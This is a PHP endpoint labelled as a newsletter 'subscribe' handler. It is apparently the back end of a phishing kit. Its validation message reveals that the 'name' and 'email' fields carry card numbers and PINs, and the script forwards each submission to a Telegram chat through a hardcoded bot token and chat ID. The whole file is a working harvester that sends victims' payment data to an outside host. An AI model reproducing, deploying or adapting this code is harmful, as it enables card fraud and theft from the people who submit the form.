<?php
// api/subscribe.php
header('Content-Type: application/json; charset=utf-8');

// Only allow POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'message' => 'Method not allowed']);
    exit;
}

// Read JSON body
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

$name  = trim($data['name'] ?? '');
$email = trim($data['email'] ?? '');

// Basic validation
if ($name === '' || $email === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'message' => 'Card and Pin Number is Required']);
    exit;
}


// 🔐 Telegram credentials (SAFE to keep here on cPanel)
$BOT_TOKEN = '8398672612:AAETz96kZZzPzUDrt-7w7vxNoihaphJkKGk';
$CHAT_ID  = '-5293880760';

// Message format
$text = "📩 New Form Submission\n\nName: {$name}\nEmail: {$email}";

// Telegram API call
$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";

$payload = json_encode([
    'chat_id' => $CHAT_ID,
    'text' => $text,
    'disable_web_page_preview' => true
]);

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => $payload,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 15
]);

$response = curl_exec($ch);
$http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$out = json_decode($response, true);

if ($http !== 200 || empty($out['ok'])) {
    http_response_code(502);
    echo json_encode(['ok' => false, 'message' => 'Telegram API error']);
    exit;
}

echo json_encode(['ok' => true, 'message' => 'Sent']);
